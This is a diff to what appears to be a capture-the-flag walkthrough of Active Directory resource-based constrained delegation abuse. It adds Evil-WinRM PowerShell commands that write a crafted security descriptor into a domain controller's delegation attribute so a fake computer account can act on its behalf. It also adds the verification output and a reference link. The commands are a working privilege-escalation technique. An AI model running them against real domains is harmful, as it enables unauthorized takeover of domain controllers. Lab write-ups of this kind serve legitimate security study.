@@ -410,13 +410,47 @@ Now I’ll configure the DC to trust my fake computer to make authorization deci
 
 ```bash
 *Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
+*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
+
+Verify that there is an ACL with the `SecurityIdentifier` of my fake computer and it says `AccessAllowed`.
+
+
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl
+
+
+BinaryLength       : 36
+AceQualifier       : AccessAllowed
+IsCallback         : False
+OpaqueLength       : 0
+AccessMask         : 983551
+SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5601
+AceType            : AccessAllowed
+AceFlags           : None
+IsInherited        : False
+InheritanceFlags   : None
+PropagationFlags   : None
+AuditFlags         : None
+```
+
+
+
+
+
+
+
+
 
 
 # Resources
 
 * [BloodHound 2.1's New Computer Takeover Attack - GenericAll](https://www.youtube.com/watch?v=RUbADHcBLKg&t=99s)
-
+* [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
 
 
 
